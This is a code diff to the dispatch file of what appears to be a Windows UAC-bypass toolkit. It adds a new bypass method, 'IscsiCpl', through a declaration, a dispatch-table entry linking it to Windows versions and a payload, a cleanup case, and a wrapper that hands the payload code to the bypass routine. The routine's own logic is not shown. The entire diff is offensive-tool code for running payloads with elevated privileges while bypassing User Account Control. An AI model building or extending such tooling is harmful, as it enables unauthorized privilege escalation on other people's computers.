@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.62
+*  VERSION:     3.63
 *
-*  DATE:        08 Jul 2022
+*  DATE:        16 Jul 2022
 *
 *  UAC bypass dispatch.
 *
@@ -49,6 +49,7 @@ UCM_API(MethodMsdt);
 UCM_API(MethodDotNetSerial);
 UCM_API(MethodVFServerTaskSched);
 UCM_API(MethodVFServerDiagProf);
+UCM_API(MethodIscsiCpl);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -141,7 +142,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE }
+    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
 };
 
 /*
@@ -245,6 +247,10 @@ VOID PostCleanupAttempt(
 
     case UacMethodHakril:
         ucmHakrilMethodCleanup();
+        break;
+
+    case UacMethodIscsiCpl:
+        ucmIsciCplMethodCleanup();
         break;
 
     default:
@@ -789,6 +795,13 @@ UCM_API(MethodVFServerTaskSched)
 UCM_API(MethodVFServerDiagProf)
 {
     return ucmVFServerDiagProfileMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodIscsiCpl)
+{
+    return ucmIsciCplMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
